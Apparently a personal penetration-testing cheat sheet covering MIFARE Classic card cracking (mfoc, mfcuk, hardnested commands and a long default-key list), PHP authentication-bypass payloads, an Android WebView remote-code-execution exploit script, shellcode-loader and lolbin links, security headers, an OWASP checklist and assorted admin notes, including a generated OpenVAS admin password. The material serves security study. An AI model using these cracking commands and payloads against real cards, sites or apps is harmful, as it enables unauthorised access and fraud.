-----------

-----------Fist steps libnfc PN532
# https://firefart.at/post/how-to-crack-mifare-classic-cards/
sudo apt-get install dh-autoreconf
sudo apt-get install autoconf
sudo apt-get install libusb-dev libpcsclite-dev libglib2.0-dev
sudo apt-get install libusb-0.1-4 libpcsclite1 libccid pcscd libftdi1
git clone https://github.com/nfc-tools/libnfc.git
cd libnfc
autoreconf -vis
./configure --with-drivers=pn532_uart --enable-serial-autoprobe
make
sudo make install
vim /etc/nfc/libnfc.conf			--> descomentar lineas
# --
READ CARD TO FILE
sudo nfc-mfclassic r b u mycard1.mfd
-----------

-----------Crack Mifare Classic - Nested attack - PN532
# https://firefart.at/post/how-to-crack-mifare-classic-cards/
# https://www.blackhat.com/docs/sp-14/materials/arsenal/sp-14-Almeida-Hacking-MIFARE-Classic-Cards-Slides.pdf
# First attack. If you find default keys keep runing it, otherwise use the MFCUK attack to get the first key.
mfoc -O output.mfd
-----------

-----------Other typical keys - Mifare
FFFFFFFFFFFF
A0A1A2A3A4A5
D3F7D3F7D3F7
000000000000
B0B1B2B3B4B5
4D3A99C351DD
1A982C7E459A
AABBCCDDEEFF
714C5C886E97
587EE5F9350F
A0478CC39091
533CB6C723F6
8FD0A4F256E9
A64598A77478
26940B21FF5D
FC00018778F7
00000FFE2488
5C598C9C58B5
E4D2770A89BE
434F4D4D4F41
434F4D4D4F42
47524F555041
47524F555042
505249564141
505249564142
0297927C0F77
EE0042F88840
722BFCC5375F
F1D83F964314
54726176656C
776974687573
4AF9D7ADEBE4
2BA9621E0A36
000000000001
123456789ABC
B127C6F41436
12F2EE3478C1
34D1DF9934C5
55F5A5DD38C9
F1A97341A9FC
33F974B42769
14D446E33363
C934FE34D934
1999A3554A55
27DD91F1FCF1
A94133013401
99C636334433
43AB19EF5C31
A053A292A4AF
505249565441
505249565442
FC0001877BF7
A0B0C0D0E0F0
A1B1C1D1E1F1
BD493A3962B6
010203040506
111111111111
222222222222
333333333333
444444444444
555555555555
666666666666
777777777777
888888888888
999999999999
AAAAAAAAAAAA
BBBBBBBBBBBB
CCCCCCCCCCCC
DDDDDDDDDDDD
EEEEEEEEEEEE
0123456789AB
000000000002
00000000000A
00000000000B
100000000000
200000000000
A00000000000
B00000000000
ABCDEF123456
F4A9EF2AFC6D
4B0B20107CCB
569369C5A0E5
632193BE1C3C
644672BD4AFE
8FE644038790
9DE89E070277
B5FF67CBA951
EFF603E1EFE9
F14EE7CAE863
44AB09010845
85FED980EA5A
314B49474956
564C505F4D41
0263DE1278F3
067DB45454A9
0DB5E6523F7C
100533B89331
136BDB246CAC
15FC4C7613FE
16F21A82EC84
16F3D5AB1139
17758856B182
186D8C4B93F9
1FC235AC1309
22C1BAE1AACD
243F160918D1
25094DF6F148
2735FC181807
2A3C347A1200
2ABA9519F574
2B7F3253FAC5
324F5DF65310
32AC3B90AC13
35C3D2CAEE88
3A42F33AF429
3A4BBA8ADAF0
3DF14C8000A1
3E3554AF0E12
3E65E4FB65B3
40EAD80721CE
454841585443
460722122510
48FFE71294A0
491CDCFB7752
4AD1E273EAF1
4B791BEA7BCC
51119DAE5216
51284C3686A6
528C9DFFE28C
5EB8F884C8D1
5F146716E373
6202A38F69E2
6338A371C0ED
63F17A449AF0
643FB6DE2217
64E3C10394C2
653A87594079
67362D90F973
682D401ABB09
68D30288910A
693143F10368
6A470D54127C
73068F118C13
740E9A4F9AAF
75CCB59C9BED
75D8690F21B6
75EDE6A84460
7DE02A7F6025
82F435DEDF01
83E3549CE42D
84FD7F7A12B6
85675B200017
871B8C085997
8765B17968A2
937A4FFF3011
97184D136233
97D1101F18B0
9AFA6CB4FC3D
9AFC42372AF1
9F131D8C2057
A27D3804C259
A3F97428DD01
A73F5DC1D333
A8966C7CC54B
A9F953DEF0A3
AAFB06045877
AC0E24C75527
AE3D65A3DAD4
AE3FF4EEA0DB
B0C9DD55DD4D
B20B83CB145C
B736412614AF
BF23A53C1F63
C4652C54261C
C6AD00254562
C7C0ADB3284F
C82EC29E3235
CB9A1F2D7368
D39BB83F5297
D49E2826664F
D8A274B2E026
DF27A8F1CB8E
E2C42591368A
E3429281EFC1
E444D53D359F
F124C2578AD0
F59A36A2546D
FEE470A4CB58
-----------

-----------Crack Mifare Classic - MFCUK attack - PN532
mfcuk -C -R 0:A -s 250 -S 250 -v 5
-----------

-----------HardNested - Crack Mifare Classic emulated in Mifare Plus (not affected my nested or mfcuk vulns) - PN532
git clone https://github.com/aczid/crypto1_bs
cd crypto1_bs
make get_crapto1
make get_craptev1
make -f Makefile
./libnfc_crypto1_crack FFFFFFFFFFFF 0 A 20 A		--> known key of bock 0(sector 1) key A, target key block 20(sector 5) key A
# once you have one key come back to the classic Nested attack with mfoc to check if it's the same in other sectors
-----------

-----------Cracking Mifare Classic 1K- RFID
# https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2019/july/charlicard/
-----------
=================================><===


=================================>IoT <===
-----------Create UART to TCP IoT with Mongoose tools
# download miot from https://mongoose-iot.com/software.html
wget https://mongoose-iot.com/downloads/miot/linux/miot
chmod +x miot
chmod +x 755
wget http://mongoose.cloud/downloads/tcpuart/tcpuart-esp8266.zip
sudo ./miot flash --port /dev/ttyUSB0 --firmware tcpuart-esp8266.zip
# now it has been created a free wifi were it's possible to config everything, otherwise it's also possible to config the AP by cmds 
sudo ./miot config-set --port /dev/ttyS0 clubby.uart.uart_no=-1 uart.uart_no=0 debug.stderr_uart=-1 wifi.ap.enable=true wifi.sta.ssid=WIFI_NAME wifi.sta.pass=WIFI_PASS
-----------

-----------Create normal iot with Mongoose Cloud
https://mongoose-iot.com/docs/#/quickstart/overview.md/
On an empty dir:
	mkdir esp8266; cd esp8266
	sudo ../miot init --arch esp8266
	sudo ../miot build --user pepe --pass XXXXXXXX
	sudo ../miot flash --port /dev/ttyUSB0 --firmware build/fw.zip
	sudo ../miot config-set --port /dev/ttyUSB0 wifi.ap.enable=true wifi.ap.ssid=WIFIWEMOW wifi.ap.pass=xxxxxx wifi.sta.enable=true wifi.sta.ssid=MOVISTAR wifi.sta.pass=XXXXXXX
	sudo ../miot register --port /dev/ttyUSB0 --user pepe --pass XXXXXX --device-id wemoss --device-pass pepe
-----------

-----------IoT Resources
# https://github.com/nebgnahz/awesome-iot-hacks
-----------

=================================><===


=================================>CODE REVIEW <===
-----------Strcmp - login bypass - (PHP)
if($_GET['login']=="admin" && strcmp($_GET['password'], $password)==0)
# --
www.xxx.com/login.php?login=admin&password[]=
# It's recommended to use the === operator
-----------

-----------Deserialize cookies with == operator - (PHP)
$auth = unserialize(base64_decode($_COOKIE['creds']));
if ($auth['username']) == 'admin' && $auth['password'] == $password
# --
a:2:{s:8:"username";s:5:"admin";s:8:"password";s:4:"pepe"}			--> normal cookie with user/pass (base64 decoded)
a:2:{s:8:"username";s:5:"admin";s:8:"password";b:1;}			--> checking the table above we can bypass it bit a boolean 1 (true)
# --
# https://hydrasky.com/wp-content/uploads/2017/05/loose-comparison.png				--> == operator comparasion table
# It's recommended to use the === operator
-----------

-----------Webviewgui vulnerability - RCE - (Java-Android)
public class WebViewGUI extends Activity {
 
  WebView mWebView;
  public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    mWebView=new WebView(this);
    mWebView.getSettings().setJavaScriptEnabled(true);
    mWebView.addJavascriptInterface(new JavaScriptInterface(), "jsinterface");
    mWebView.loadUrl("http://www.xxxxxx.com");
    setContentView(mWebView);
  }
 
  final class JavaScriptInterface {
    JavaScriptInterface () { }
    public String getSomeString() {
      return "string";
    }
  }
}
# jsinterface is exposed for Javascript 
# Example code to exploit it:
	<script>
	function execute(cmd){
	  return window.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);
	}
	execute(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);
	</script>
-----------

-----------MITRE - Common Weakness Enumeration list 
# https://cwe.mitre.org/data/
-----------

=================================><===


=================================>CODING <===
-----------Big O complexity Chart
# http://bigocheatsheet.com/
# http://mattjmatthias.co/articles/dev-training-big-o-notation
-----------

-----------Sets in python
# A Set is a collection of unique items (sorted). It is possible to perform mathematical set operations like union, intersection, symmetric difference etc.
# https://www.programiz.com/python-programming/set

### Create an empty set:
theset = set()

### Initialize set with values:
my_set = {1, 2, 3}
print(my_set)

### Add element:
my_set.add(2)

### Discard element:
my_set.discard(4)

### Membership:
'a' in my_set

### Mathematical operations between Sets:
A.union(B)					--> Also with: A | B
A.intersection(B)			--> Also with: A & B
A.difference(B) 			--> Also with: A - B
A.symmetric_difference(B)	-->Also with: A ^ B
-----------

-----------Argparse - python
# https://stackoverflow.com/questions/7427101/simple-argparse-example-wanted-1-argument-3-results
# default: default value if the arg is omitted.
# type: if you expect a float or int (otherwise is str).
# dest: give a different name to a flag (e.g. '-x', '--long-name', dest='longName').
# Note: by default --long-name is accessed with args.long_name
# action: for special handling of certain arguments
  store_true, store_false: for boolean args
  '--foo', action='store_true' => args.foo == True
# store_const: to be used with option const
  '--foo', action='store_const', const=42 => args.foo == 42
# count: for repeated options, as in ./myscript.py -vv
  '-v', action='count' => args.v == 2
# append: for repeated options, as in ./myscript.py --foo 1 --foo 2
  '--foo', action='append' => args.foo == ['1', '2']
# required: if a flag is required, or a positional argument is not.
# nargs: for a flag to capture N args
  ./myscript.py --foo a b  =>  args.foo = ['a', 'b']
# choices: to restrict possible inputs (specify as list of strings, or ints if type=int).
-----------
=================================><===


=================================>MALWARE <===
-----------Deobfuscating Javascript dropper malware
# http://resources.infosecinstitute.com/reverse-engineering-javascript-obfuscated-dropper/
-----------

-----------Malware Resources
# https://github.com/rshipp/awesome-malware-analysis
-----------

-----------Reset password macros Office document
# http://datapigtechnologies.com/blog/index.php/hack-into-password-protected-vba-projects/
-----------

-----------Macros obfuscation
# https://github.com/Pepitoh/VBad
-----------

-----------Javascript anti-debuggin tricks
# https://x-c3ll.github.io/posts/javascript-antidebugging/
-----------

-----------Reflected execution of PE (exe, dll)
# https://www.defcon.org/images/defcon-21/dc-21-presentations/Bialek/DEFCON-21-Bialek-PowerPwning-Post-Exploiting-by-Overpowering-Powershell.pdf
How To Load A PE
1. Allocate memory for PE
2. Copy PE headers to memory
3. Copy sections to memory (.text, .data, etc.)
4. Perform “base relocations” on the sections loaded
5. Load DLL’s the PE requires
6. Adjust memory permissions
7. Call the entry function
– For DLL: Calls DllMain which lets the DLL know it is loaded
– For EXE: Function which sets up the process, gets
command line arguments and calls int main()
-----------

-----------Dynamic analyzers
https://www.hybrid-analysis.com/
https://any.run/
-----------

-----------CSharp loader and DotNetToJScript, XSL
# https://rastamouse.me/2018/05/csharp-dotnettojscript-xsl/
-----------

-----------Compile C#
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -unsafe -platform:x86 -target:library shellcode.cs
-----------

-----------DueDLLigence - whitelisting bypasses and DLL side-loading (shellcode) lolbins
# https://github.com/fireeye/DueDLLigence
-----------

-----------C# loader with xor encryption
# https://github.com/Y4er/shellcode-loader
-----------

-----------Lolbins - lolbas
# https://lolbas-project.github.io/
-----------
=================================><===


=================================>THEORY AND RESOURCES <===
-----------Security Headers
### X-XSS-Protection
X-XSS-Protection sets the configuration for the cross-site scripting filter built into most browsers. 
Recommended value "X-XSS-Protection: 1; mode=block"
### Content-Security-Policy
Content Security Policy is an effective measure to protect your site from XSS attacks. By whitelisting sources of approved content, you can prevent the browser from loading malicious assets.
### X-Content-Type-Options
X-Content-Type-Options stops a browser from trying to MIME-sniff the content type and forces it to stick with the declared content-type.
The only valid value for this header is "X-Content-Type-Options: nosniff"
### X-Powered-By
The X-Powered-By header gives information on the technology that's supporting the Web Server. With typical values like ASP.NET or PHP/5.4.0, 
this is another piece of information that we can remove from public display.
### Accept-Ranges
Unconstrained multiple range requests are susceptible to denial-of-service attacks because the effort required to request many overlapping ranges of the same data is tiny compared to the time, memory, 
and bandwidth consumed by attempting to serve the requested data in many parts.
### Strict-Transport-Security
HTTP Strict Transport Security is an excellent feature to support on your site and strengthens your implementation of TLS by getting theUser Agent to enforce the use of HTTPS. 
Recommended value "strict-transport-security: max-age=31536000; includeSubDomains"
### Server
The Server response-header field contains information about the software used by the origin server to handle the request. The field can
contain multiple product tokens (section 3.8) and comments identifying the server and any significant subproducts. The product tokens are
listed in order of their significance for identifying the application.
### Pragma
The Pragma general-header field is used to include implementation- specific directives that might apply to any recipient along the
request/response chain. All pragma directives specify optional behavior from the viewpoint of the protocol; however, some systems MAY
require that behavior be consistent with the directives. Ideally, the web server should return the following HTTP headers in all responses
containing sensitive content: "Pragma: no-store"
### Cache-control
Unless directed otherwise, browsers may store a local cached copy of content received from web servers. Some browsers, including
Internet Explorer, cache content accessed via HTTPS. If sensitive information in application responses is stored in the local cache, then
this may be retrieved by other users who have access to the same computer at a future time. Ideally, the web server should return the
following HTTP headers in all responses containing sensitive content: "Cache-control: no-store"
### X-Frame-Options
X-Frame-Options tells the browser whether you want to allow your site to be framed or not. By preventing a browser from framing your site you can defend against attacks like clickjacking. 
Recommended value "x-frame-options: SAMEORIGIN"
### Content-Type
The Content-Type entity-header field indicates the media type of the entity-body sent to the recipient or, in the case of the HEAD method,
the media type that would have been sent had the request been a GET. 
An ideal example of the field is "Content-Type: text/html; charset=ISO-8859-4"
### Public-Key-Pins
HTTP Public Key Pinning protects your site from MiTM attacks using rogue X.509 certificates. By whitelisting only the identities that the
browser should trust, your users are protected in the event a certificate authority is compromised.
-----------

-----------SSL & Certificates - how it works
# https://lowleveldesign.org/2016/03/09/manually-decrypting-https-request/			--> wireshark manual/automatic ssl decryption
# https://hackaday.com/2017/10/18/practical-public-key-cryptography/
### PHASE 0 - REQUIREMENTS
The server has submited to the CA all his data (IP, name, Public Key of the server), and will get a signed certificate (CA private key signed)
The client has to have the CA public key installed on the browser.
The client request a connection throught https (SSL), and makes an agreement of the algorithms and versions used.
### PHASE 1 - TRUST (CA)
The server sends a copy of the certificate (signed by the CA)
The user checks (if he trust it) it with the CA Public key
### PHASE 0 - ENCRYPTION
The client generates a symmetric key and encrypts it with the public key of the server (received in the certificate)
The server decrypts the symmetric key with the Private Key.
They start an encrypted connection using the symmetric keys.
-----------

-----------OWASP top 10 Checklist
# https://github.com/jshaw87/Cheatsheets/blob/master/Cheatsheet_OWASPCheckList.txt
### Information Gathering
Manually explore the site
Spider/crawl for missed or hidden content
Check for files that expose content, such as robots.txt, sitemap.xml, .DS_Store
Check the caches of major search engines for publicly accessible sites
Check for differences in content based on User Agent (eg, Mobile sites, access as a Search engine Crawler)
Perform Web Application Fingerprinting
Identify technologies used
Identify user roles
Identify application entry points
Identify client-side code
Identify multiple versions/channels (e.g. web, mobile web, mobile app, web services)
Identify co-hosted and related applications
Identify all hostnames and ports
Identify third-party hosted content
### Configuration Management
Check for commonly used application and administrative URLs
Check for old, backup and unreferenced files
Check HTTP methods supported and Cross Site Tracing (XST)
Test file extensions handling
Test for security HTTP headers (e.g. CSP, X-Frame-Options, HSTS)
Test for policies (e.g. Flash, Silverlight, robots)
Test for non-production data in live environment, and vice-versa
Check for sensitive data in client-side code (e.g. API keys, credentials)
### Secure Transmission
Check SSL Version, Algorithms, Key length
Check for Digital Certificate Validity (Duration, Signature and CN)
Check credentials only delivered over HTTPS
Check that the login form is delivered over HTTPS
Check session tokens only delivered over HTTPS
Check if HTTP Strict Transport Security (HSTS) in use
### Authentication
Test for user enumeration
Test for authentication bypass
Test for bruteforce protection
Test password quality rules
Test remember me functionality
Test for autocomplete on password forms/input
Test password reset and/or recovery
Test password change process
Test CAPTCHA
Test multi factor authentication
Test for logout functionality presence
Test for cache management on HTTP (eg Pragma, Expires, Max-age)
Test for default logins
Test for user-accessible authentication history
Test for out-of channel notification of account lockouts and successful password changes
Test for consistent authentication across applications with shared authentication schema / SSO
### Session Management
Establish how session management is handled in the application (eg, tokens in cookies, token in URL)
Check session tokens for cookie flags (httpOnly and secure)
Check session cookie scope (path and domain)
Check session cookie duration (expires and max-age)
Check session termination after a maximum lifetime
Check session termination after relative timeout
Check session termination after logout
Test to see if users can have multiple simultaneous sessions
Test session cookies for randomness
Confirm that new session tokens are issued on login, role change and logout
Test for consistent session management across applications with shared session management
Test for session puzzling
Test for CSRF and clickjacking
### Authorization
Test for path traversal
Test for bypassing authorization schema
Test for vertical Access control problems (a.k.a. Privilege Escalation)
Test for horizontal Access control problems (between two users at the same privilege level)
Test for missing authorization
### Data Validation
Test for Reflected Cross Site Scripting
Test for Stored Cross Site Scripting
Test for DOM based Cross Site Scripting
Test for Cross Site Flashing
Test for HTML Injection
Test for SQL Injection
Test for LDAP Injection
Test for ORM Injection
Test for XML Injection
Test for XXE Injection
Test for SSI Injection
Test for XPath Injection
Test for XQuery Injection
Test for IMAP/SMTP Injection
Test for Code Injection
Test for Expression Language Injection
Test for Command Injection
Test for Overflow (Stack, Heap and Integer)
Test for Format String
Test for incubated vulnerabilities
Test for HTTP Splitting/Smuggling
Test for HTTP Verb Tampering
Test for Open Redirection
Test for Local File Inclusion
Test for Remote File Inclusion
Compare client-side and server-side validation rules
Test for NoSQL injection
Test for HTTP parameter pollution
Test for auto-binding
Test for Mass Assignment
Test for NULL/Invalid Session Cookie
### Denial of Service
Test for anti-automation
Test for account lockout
Test for HTTP protocol DoS
Test for SQL wildcard DoS
### Business Logic
Test for feature misuse
Test for lack of non-repudiation
Test for trust relationships
Test for integrity of data
Test segregation of duties
### Cryptography
Check if data which should be encrypted is not
Check for wrong algorithms usage depending on context
Check for weak algorithms usage
Check for proper use of salting
Check for randomness functions
### Risky Functionality - File Uploads
Test that acceptable file types are whitelisted
Test that file size limits, upload frequency and total file counts are defined and are enforced
Test that file contents match the defined file type
Test that all file uploads have Anti-Virus scanning in-place.
Test that unsafe filenames are sanitised
Test that uploaded files are not directly accessible within the web root
Test that uploaded files are not served on the same hostname/port
Test that files and other media are integrated with the authentication and authorisation schemas
### Risky Functionality - Card Payment
Test for known vulnerabilities and configuration issues on Web Server and Web Application
Test for default or guessable password
Test for non-production data in live environment, and vice-versa
Test for Injection vulnerabilities
Test for Buffer Overflows
Test for Insecure Cryptographic Storage
Test for Insufficient Transport Layer Protection
Test for Improper Error Handling
Test for all vulnerabilities with a CVSS v2 score > 4.0
Test for Authentication and Authorization issues
Test for CSRF
### HTML 5
Test Web Messaging
Test for Web Storage SQL injection
Check CORS implementation
Check Offline Web Application
-----------

-----------Type of Proxies explained
# http://docs.mitmproxy.org/en/stable/modes.html
# Regular Proxy
You can configure it directly from the APP/OS.
# Transparetn Proxy
You can't configure it directly, so, you put it in the middle.
# Reverse Proxy
On the server, debug...
# Upstream
To chain proxies.
-----------

-----------Videos and Talks (updated)
# https://github.com/PaulSec/awesome-sec-talks
-----------

-----------SecGlobal many Resources
# https://github.com/Hack-with-Github/Awesome-Hacking/blob/master/README.md
-----------

-----------Payloads, Burp IntruderPayloads
# https://github.com/1N3/IntruderPayloads
# https://github.com/1N3/IntruderPayloads/tree/master/FuzzLists
-----------

-----------SecLists - Passwords, Discovery, Fuzzing, etc.
# https://github.com/danielmiessler/SecLists
-----------

-----------All kind of Payloads
# https://github.com/swisskyrepo/PayloadsAllTheThings
# AWS Amazon Bucket S3, CRLF injection, CSV injection, CVE Shellshock Heartbleed Struts2, File Inclusion, Path Traversal, LDAP Injection, NoSQL injection, OAuth, Open redirect, PHP juggling type, 
# PHP serialization, Remote commands execution, SQL injection, SSRF injection, Server Side Template Injections, Tar commands execution, Traversal directory, Upload insecure files, Web cache deception, 
# XPATH injection, XSS injection, XXE injections
-----------

-----------Lateral movements - RedTeam
# http://cert.europa.eu/static/WhitePapers/CERT-EU_SWP_17-002_Lateral_Movements.pdf
-----------

-----------Kerberos, Golden Tickets
# http://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf
# https://www.tarlogic.com/blog/como-funciona-kerberos/
# https://www.tarlogic.com/blog/como-atacar-kerberos/
-----------

-----------Online Certificate Status Protocol (OCSP)
Objective: detect revoked certificates.
- Alice and Bob have public key certificates issued by Carol, the Certificate Authority (CA).
- Alice wishes to perform a transaction with Bob and sends him her public key certificate.
- Bob, concerned that Alice's private key may have been compromised, creates an 'OCSP request' that contains Alice's certificate serial number and sends it to Carol.
- Carol's OCSP responder reads the certificate serial number from Bob's request. The OCSP responder uses the certificate serial number to look up the revocation 
status of Alice's certificate. The OCSP responder looks in a CA database that Carol maintains. In this scenario, Carol's CA database is the only trusted location 
where a compromise to Alice's certificate would be recorded.
- Carol's OCSP responder confirms that Alice's certificate is still OK, and returns a signed, successful 'OCSP response' to Bob.
- Bob cryptographically verifies Carol's signed response. Bob has stored Carol's public key sometime before this transaction. Bob uses Carol's public key to verify Carol's response.
- Bob completes the transaction with Alice.
-----------

-----------Certificate Transparency (CT)
# http://www.certificate-transparency.org/how-ct-works
# https://crt.sh/?q=%25.example.com
Objective: detect CA misbehaviors / fraudulent certificates.
- There is a log (stored by google for example) with all the certificates issued by the CA.
- It can be sent by the CA, the user in the SSL/TLS connection or as part of the OCSP.
- They can be checked in https://crt.sh/
- It can be used to discover subdomains.
-----------

-----------How to detect the use of fraudulent certificates in MitM for example?
- When you use these certificates, the client sends an OCSP request to the CA, so the CA stores all this information.
- Also, the CT (Certificate Transparency) entity will receive it after during the SSL/TLS connection.
So, they are not stored or publicly available but the information could be obtained from internal logs.
-----------

-----------How DNS Hierarchy works
# Hierarchy: DNS Server -> Root Server -> TLD (Top Level Domain) -> SLD (Second Level Domain)
- Browser -> [requests IP of google.es] -> to DNS Server
- DNS Server -> [requests the TLD of .es] -> to Root DNS Server
- DNS Server -> [requests the SLD of google.es] -> to TLD Server
- DNS Server -> [requests the IP of google.es] -> to SLD Server
-----------

-----------Private Network Ranges
[IP address range]				[number of addr]	[largest CIDR block] 	[subnet mask]		[classful]
10.0.0.0 – 10.255.255.255		16,777,216			10.0.0.0/8 				255.0.0.0			class A network
172.16.0.0 – 172.31.255.255		1,048,576			172.16.0.0/12 			255.240.0.0			class B networks
192.168.0.0 – 192.168.255.255	65,536				192.168.0.0/16 			255.255.0.0			class C networks
-----------

-----------.NET versions by OS
# Windows XP Media Center Edition (Windows XP SP1)
Includes the .NET Framework 1.0 + SP2 as an OS component.
# Windows XP Media Center Edition (Windows XP SP2 and higher)
includes the .NET Framework 1.0 + SP3 as an OS component. On Windows XP Media Center Edition, the only way to get the .NET Framework 1.0 SP3 is to install Windows XP SP2 or higher.
# Windows XP Tablet PC Edition (Windows XP SP1) 
Includes the .NET Framework 1.0 + SP2 as an OS component
# Windows XP Tablet PC Edition (Windows XP SP2 and higher)
Includes the .NET Framework 1.0 + SP3 as an OS component. On Windows XP Tablet PC Edition, the only way to get the .NET Framework 1.0 SP3 is to install Windows XP SP2 or higher.
# Windows Server 2003 (all x86 editions)
Includes the .NET Framework 1.1 as an OS component; 64-bit versions of Windows Server 2003 do not include a version of the .NET Framework as an OS component
# Windows Vista (all editions)
Includes the .NET Framework 2.0 and 3.0 as OS components  3.0 can be added or removed via the Programs and Fatures control panel.
# Windows Vista SP1 (all editions)
Includes the .NET Framework 2.0 SP1 and 3.0 SP1 as OS components. 3.0 SP1 can be added or removed via the Programs and Features control panel.
# Windows Server 2008 and Windows Server 2008 SP1 (all editions)
Includes the .NET Framework 2.0 SP1 and 3.0 SP1 as OS components. The .NET Framework 3.0 SP1 is not installed by default and must be added via the Programs and Features control panel though.
# Windows Server 2008 SP2 (all editions)
Includes the .NET Framework 2.0 SP2 and 3.0 SP2 as OS components. The .NET Framework 3.0 SP2 is not installed by default and must be added via the Programs and Features control panel though.
# Windows Server 2008 R2 (all editions)
Includes the .NET Framework 3.5.1 as an OS component. This means you will get the .NET Framework 2.0 SP2, 3.0 SP2 and 3.5 SP1 plus a few post 3.5 SP1 bug fixes.
# Windows 7 (all editions)
Includes the .NET Framework 3.5.1 as an OS component. This means you will get the .NET Framework 2.0 SP2, 3.0 SP2 and 3.5 SP1 plus a few post 3.5 SP1 bug fixes.
# Windows 8 (all editions)
Includes the .NET Framework 4.5 as an OS component, and it is installed by default. It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows 8.1 (all editions)
Includes the .NET Framework 4.5.1 as an OS component, and it is installed by default. It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows Server 2012 (all editions)
Includes the .NET Framework 4.5 as an OS component, and it is installed by default except in the Server Core configuration. 
It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows Server 2012 R2 (all editions)
Includes the .NET Framework 4.5.1 as an OS component, and it is installed by default except in the Server Core configuration.
It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows 10 (all editions)
Includes the .NET Framework 4.6 as an OS component, and it is installed by default.
It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows 10 November 2015 Update (all editions)
Includes the .NET Framework 4.6.1 as an OS component, and it is installed by default. 
It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows 10 Anniversary Update (all editions)
Includes the .NET Framework 4.6.2 as an OS component, and it is installed by default. It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows Server 2016 (all editions)
Includes the .NET Framework 4.6.2 as an OS component, and it is installed by default except in the Server Core configuration. 
It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows 10 Creators Update (all editions) 
Includes the .NET Framework 4.7 as an OS component, and it is installed by default. It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows 10 Fall 2017 Creators Update (all editions) 
Includes the .NET Framework 4.7.1 as an OS component, and it is installed by default. It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
# Windows 10 April 2018 Update (all editions)
Includes the .NET Framework 4.7.2 as an OS component, and it is installed by default. It also includes the .NET Framework 3.5 SP1 as an OS component that is not installed by default.
-----------

-----------SWIFT
# https://www.youtube.com/watch?v=pFLmg07QfZo
# https://fin.plaid.com/articles/what-is-swift/
# https://www.quora.com/How-does-money-transfer-between-banks-and-different-countries-work
### Communication protocols:
SWIFTnet FIN 	--> core service for exchanging MT format financial messages
SWIFTnet FileAct 	--> echange files (large reports, batch of messages)
SWIFTnet InterAct 	--> real time quering/messaging
SWIFTnet WebAccess 	--> web access

### Messages codes:
Category 1 – Messages starting MT1xx –  Customer Payments & Cheques
	MT101 – Request for Transfer
  	MT104 - Direct debit and request for direct debit
Category 2 – Messages starting MT2xx – Financial Institution Transfers
Category 3 – Messages starting MT3xx – Treasury Markets, to handle Foreign Exchange, Money Markets and Derivatives
Category 4 – Messages starting MT4xx – Collection & Cash Letters
Category 5 – Messages starting MT5xx – Securities Markets
Category 6 – Messages MT600 – MT609 – Treasury Markets – Previous Metals
Category 6 – Messages MT643 – MT649 – Treasury Markets – Syndications
Category 7 – Messages starting MT7xx – Documentary Credits & Guarantees
Category 8 – Messages starting MT8xx – Travellers Cheques
Category 9 – Messages starting MT9xx – Cash Management & Customer Status
	MT900 – Confirmation of Debit
	MT940 – Customer Statement Message
	MT942 – Interim Transaction Report
Category n – Common Messages found across the above Categories
	MTn90 – Advice of Charges, Interest and other Adjustments
	MTn91 – Request for Payment of Charges, Interest and other Expenses
	MTn92 – Request for Cancellation
	MTn95 – Queries
	MTn96 – Answers
	MTn98 – Proprietary message – messages defined and exchanged between users
	MTn99 – Free format message – often used by banks to send details of payments in error
	MT199 is often sent by the banks to corporates indicating why a payment has failed
-----------
=================================><===


=================================>OTHER STUFF <===
-----------Rips-> code review PHP ASPX...
/var/www/html/rips
-----------

-----------Netdiscover (can be passive)
netdiscover -i eth0 -r X.X.X.X/24
-----------

-----------Hash identificator (Kali)
hash-identifier
-----------

-----------CloudWatch Log Agent Install - AWS
# http://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/QuickStartEC2Instance.html
# Create a IAM user with a policy with restricted permissions to just push logs to the selected group and stream 
# For Ubuntu:
curl https://s3.amazonaws.com//aws-cloudwatch/downloads/latest/awslogs-agent-setup.py -O
sudo python ./awslogs-agent-setup.py --region us-east-1
-----------

-----------VirtualBox guest tools 2018
sudo vim /etc/apt/sources.list			--> enable also deb-src source
sudo apt-get update
sudo apt-get install linux-image-$(uname -r)
sudo apt-get install linux-headers-$(uname -r)
apt-cache search linux-headers			--> if you can't find the current version, make a full upgrade to the newest Kali: apt update && apt -y full-upgrade
reboot
sudo apt-get install virtualbox-guest-x11
# Mount shared folders:
mkdir /media/sf_SharedVM
sudo mount -t vboxsf SharedVM /media/sf_SharedVM/
# Automount:
mkdir /media/sf_SharedVM
printf '%s\n' '#!/bin/bash' 'mount -t vboxsf SharedVM /media/sf_SharedVM/' 'exit 0' | sudo tee -a /etc/rc.local
sudo chmod +x /etc/rc.local
-----------

-----------VirtualBox
-- NAT
Port Forwarding para maquina virtual con NAT (127.0.0.X1 2222 10.0.2.X15 22)
-- NAT NETWORK
Create a nat network, then the virtual machines can also reach their ports
-----------

-----------VIM
VIM:
:q! 				--> force close without saving
:wq					--> save and close
i					--> insert
/hola				--> search
:set hlsearch		--> highlight on search
y					--> copy line
p					--> paste line
v					--> select
u 					--> undo
o					--> insert line above
dd					--> delete line
-----------

-----------Hosts file
Hosts on windows
c:\WINDOWS\system32\drivers\etc\hosts
# Another host file:
c:\WINDOWS\system32\drivers\etc\hosts.ics
-----------

-----------Installing OpenVAS on Kali
-Update
-ifconfig lo 127.0.0.X1 netmask 255.255.255.X255
-Install
-https://127.0.0.X1:9392
-user admin and the generated password 11054493-671d-4493-925d-8468a7bc8790 (now admin)
-----------

-----------Create a bootable image
sudo fdisk -l
